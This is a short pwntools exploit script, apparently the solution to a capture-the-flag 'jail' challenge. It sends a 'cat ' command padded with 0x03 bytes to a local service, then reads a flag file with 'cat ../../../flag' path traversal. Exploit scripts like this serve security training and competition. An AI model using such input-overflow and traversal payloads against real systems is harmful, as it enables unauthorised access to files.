from pwn import *
from ctypes import *

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
binary_path = "../src/jail"

rop = ROP(binary_path)
elf = ELF(binary_path)


local = 1

ip, port = "127.0.0.1", 10001
if local == 0:
    p = process(binary_path)
    def dbg(p): return gdb.attach(p)
else:
    p = remote(ip, port)
    def dbg(_): return None


def ls(addr): return log.success(hex(addr))
def recv(char): return u64(p.recvuntil(char, drop=True).ljust(8, b"\0"))

# =================start=================#


dbg(p)
payload = b"cat "
payload = payload.ljust(0x200 - 0x1, b'\x03')
p.sendafter("$ ", payload)

payload = b'cat ../../../flag'
p.sendlineafter("$ ", payload)

p.interactive()
